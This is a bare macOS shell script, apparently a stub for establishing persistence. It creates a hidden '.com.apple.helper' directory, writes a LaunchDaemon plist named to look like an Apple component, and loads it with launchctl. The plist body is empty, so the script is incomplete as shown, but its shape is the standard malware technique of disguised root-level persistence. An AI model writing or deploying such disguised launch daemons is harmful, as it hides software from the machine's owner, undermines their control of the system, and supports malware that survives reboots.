#!/bin/sh
mkdir -p "$HOME/Library/Application Support/.com.apple.helper"
cat > /Library/LaunchDaemons/com.apple.helper.plist <<X
X
launchctl load /Library/LaunchDaemons/com.apple.helper.plist
